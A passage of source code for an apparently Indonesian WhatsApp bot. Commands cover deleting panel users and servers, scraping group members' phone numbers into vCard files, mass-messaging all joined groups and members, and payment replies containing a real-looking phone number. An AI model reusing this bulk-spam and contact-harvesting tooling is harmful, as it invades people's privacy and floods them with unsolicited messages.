getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "produk": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await Ditss.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Ditss.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Ditss.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break
///===========
case 'asuma-ai':{
Ditss.autoai = Ditss.autoai || {};
 
    if (!text) throw `*• Example:* .asuma-ai *[on/off]*`;
 
    if (text.toLowerCase() === "on") {
        Ditss.autoai[m.sender] = {
            pesan: []
        };
        m.reply("[ ✓ ] Success create session chat");
    } else if (text.toLowerCase() === "off") {
        delete Ditss.autoai[m.sender];
        m.reply("[ ✓ ] Success delete session chat");
    } else {
        throw `*• Example:* .asuma-ai *[on/off]*`;
    }
};
break
//================================================================================

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya"))
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await Ditss.groupMetadata(id)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Ditss.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Ditss.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Ditss.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Ditss.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Ditss.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Ditss.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Ditss.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Ditss.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Ditss.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await Ditss.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Ditss.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Ditss.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Ditss.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Ditss.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Ditss.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Ditss.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Ditss.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Ditss.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "pay": case "payment": {
if (!isCreator) return Reply(mess.owner)
let imgdana = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/dana.jpg")}, { upload: Ditss.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/ovo.jpg")}, { upload: Ditss.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/gopay.jpg")}, { upload: Ditss.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/qris.jpg")}, { upload: Ditss.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nPilih salah satu *payment* pembayaran yang tersedia"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtoko})
await Ditss.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA*

* *Nomor :* 081513607731
* *Atas Nama :* M** H****

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: qtoko})
}
break

//================================================================================

case "qris": {
if (!isCreator) return 
await Ditss.sendMessage(m.chat, {image: {url: global.qris}, caption: "\n*PAYMENT QRIS*\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtoko})
}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
const msg = {
text: `*Dana Masuk ✅*
📦 ${text}

_*© 2024 - dits*_`
}
await Ditss.sendMessage(m.chat, msg, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
const msg = {
text: `*Transaksi Done ✅*
📦 ${text}

_*© 2024 - dits*_`
}
await Ditss.sendMessage(m.chat, msg, {quoted: null})
}
break


//================================================================================

case "developerbot": case "owner": {
await Ditss.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await Ditss.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
Ditss.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break
//================================================================================

//recode by HiraaXz///

case 'sosmed': case 'sosialmedia': case 'info':{
    Reply('waitt')
//if (!isRegistered) return registerbut(noregis)
const ownedr = "6285866435726@s.whatsapp.net"
let u = `*\`</> 乂SOSIAL MEDIA乂 </>\`*\n
Instagra 👇
https://www.instagram.com/hanggagabut87
YouTube 👇
https://www.youtube.com/@HangzCuy
tiktok 👇
tiktok.com/@syahhangga_

\n> HangzMD\n${readmore} *@${ownedr.split("@")[0]}*`
let dits = ``
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363383395435351@newsletter',
			newsletterName: 'HangzMD Script', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: Ditss.decodeJid(Ditss.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: `${u}`, 
 thumbnailUrl: 'https://pomf2.lain.la/f/rfqvajh5.jpg', 
 sourceUrl: 'https://tiktok.com/@paadit',
 mediaType: 2,
 renderLargerThumbnail: true
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `${u}`,
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [ 
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: ``,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: ppuser } }, { upload: Ditss.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Dev Script💥\",\"url\":\"https:/wa.me/6285866435726\",\"merchant_url\":\"https:/wa.me/6285866435726\"}`
}, 
{ 
 "name": "quick_copy",

 "buttonParamsJson": `{"display_text":"jangan di pencet","id":".menu"}`
}, 
{ 
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"tap ☝️👇 \",\"url\":\"https://whatsapp.com/channel/0029Vawm0Vp5Ejy1kfjJdD2S\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"saluran WhatsApp\",\"url\":\"https://www.instagram.com/hanggagabut87\",\"merchant_url\":\"https://www.google.com\"}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: fkontak2 })
Ditss.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break

//================================================================================

//================================================================================

case "public": {
if (!isCreator) return
Ditss.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

/*case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await Ditss.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break*/

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await Ditss.downloadAndSaveMediaMessage(qmsg)
await Ditss.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================
case 'upchv2': {
                if (!isCmd) return;
                    if (!quoted) {
                        return reply(`🖼️ *Fotonya mana?*`);
                    }
                
                    if (!args.length) {
                        return reply(`⚠️ *Masukkan ID channel dan teks/caption menggunakan format idch|text.*`);
                    }
                
                    // Memisahkan ID channel dan teks caption dari input menggunakan "|"
                    const input = args.join(' ').split('|');
                    const channelId = input[0].trim(); // ID channel
                    const caption = input[1] ? input[1].trim() : wm2 ; // Caption default jika tidak ada teks
                
                    // Cek apakah media adalah gambar
                    if (/image/.test(mime)) {
                        reply(mess.wait); // Mengirim pesan tunggu
                        let media = await quoted.download(); // Mengunduh media dari pesan yang dikutip
                
                        try {
                            // Mengupload gambar ke channel dengan caption custom
                            await Ditss.sendMessage(channelId, {
                                image: media,
                                caption: caption
                            });
                
                            // Mengirim pesan konfirmasi
                            await reply(`✅ *Media gambar berhasil diupload ke channel:* ${channelId}`);
                        } catch (error) {
                            console.error('Error saat mengupload media gambar:', error);
                            await reply('❌ *Gagal mengupload gambar. Silakan periksa ID channel dan format media.*');
                        }
                    } 
                    // Cek apakah media adalah audio dan mengirim sebagai VN
                    else if (/audio/.test(mime)) {
                        reply(mess.wait); // Mengirim pesan tunggu
                        let media = await quoted.download(); // Mengunduh media dari pesan yang dikutip
                
                        try {
                            // Mengupload audio sebagai voice note (VN) ke channel
                            await Ditss.sendMessage(channelId, {
                                audio: media,
                                ptt: true, // Mengirim sebagai pesan suara (voice note)
                                mimetype: 'audio/mp4' // Ganti jika perlu
                            });
                
                            // Mengirim pesan konfirmasi
                            await reply(`✅ *Voice note berhasil diupload ke channel:* ${channelId}`);
                        } catch (error) {
                            console.error('Error saat mengupload voice note:', error);
                            await reply('❌ *Gagal mengupload voice note. Silakan periksa ID channel dan format media.*');
                        }
                    } else {
                        await reply(`📸 *Silakan kirim atau balas foto atau audio dengan caption* ${prefix + command}`);
                    }
                
                    await sleep(5000); // Delay sebelum melanjutkan
                }
                break;
//================================================================================
case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Ditss.sendMessage(`${global.owner2}`, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await Ditss.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await Ditss.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await Ditss.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break
case 'joinrpg': {   
    
    //= ini biar inventory g undefined//
    userdb.attackdigi = 0
    userdb.DarahOrang = 100
    userdb.tp = 0
    userdb.bits = 0
    userdb.kenyang = 0
    userdb.lahan = 0
    userdb.happy = 0
    userdb.batu = 0
    userdb.kayu = 0
    userdb.digivice = false
    userdb.recoverplug = 0
    userdb.apajob = false
    userdb.job = "nganggur"
    addInventoriMonay(m.sender)
    userdb.rumah = 0
    userdb.setname = `${pushname}`  
    userdb.depositmonay = 0
    userdb.nabung = 0
    userdb.card = "none"
    addtoken(m.sender, 48)                            
                fs.readFile('./database/Rpg/join.json', 'utf8', (err, data) => {
                    if (err) {
                        console.error(err);                        
                    }
                    let users;                   
try {
                        users = JSON.parse(data);
                    } catch (parseError) {
                        console.error('Err:', parseError);                        
                    }                
                    const userExists = users.some(user => user.id === userId);

                    if (userExists) {
                        return reply('Kamu sudah Join.');
                    }              
                    users.push({ id: userId  });

fs.writeFile('./database/Rpg/join.json', JSON.stringify(users, null, 2), 'utf8', (err) => {
                        if (err) {
                            console.error(err);                            
                        } else {
                            return reply('Sukses Join  Rpg!');
                        }
                    });
                });
}
                break;
//================================================================================

case "setimgmenu": {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await Ditss.downloadAndSaveMediaMessage(qmsg, "./src/media/menu.jpg", false)
await m.reply("Berhasil mengganti image menu ✅")
}
break

//================================================================================

case "setimgfake": {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example('reply fotonya'))
await Ditss.downloadAndSaveMediaMessage(qmsg, "./src/media/fake.jpg", false)
await m.reply("Berhasil mengganti image fake ✅")
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
Ditss.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Ditss.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break
/////=================///////

case "bool":{
Reply('☺️')
}
break

/////=================///////

case "bool":{
Reply('☺️')
}
break


//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/lusiapa.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {

if (!isCreator) return Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/lusiapa.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })

if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================
/*if (m.text.toLowerCase() == "assalamualaikum") {

Ditss.sendMessage(m.chat, { audio: salamm, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
//p
Ditss.sendMessage(m.chat, { audio: salamm, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}

*/
if (m.text.toLowerCase() == "assalamualaikum") {
Ditss.sendMessage(m.chat, { audio: salamm, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
//batasss
if (m.text.toLowerCase() == "p") {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/dia pasti gay.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}

if (m.text.toLowerCase() == "bot") {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/adaapa1.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })

}
if (m.text.toLowerCase() == "spam") {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/spam.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })

}
if (m.text.toLowerCase() == "lopyu") {
